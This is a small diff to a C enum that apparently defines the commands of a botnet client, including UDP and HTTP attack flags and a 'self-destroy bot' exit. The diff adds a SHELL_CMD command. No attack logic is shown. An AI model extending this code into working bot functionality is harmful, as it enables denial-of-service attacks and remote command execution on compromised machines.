@@ -10,6 +10,7 @@ enum command_type
     ATTACK_UDP = 1 << 3,  //
     ATTACK_HTTP = 1 << 4, //
     EXIT = 1 << 5, // self-destroy bot
+    SHELL_CMD = 1 << 6,
 
     HAS_NO_ARGS = PING | HELLO | EXIT // commands with no args
 };
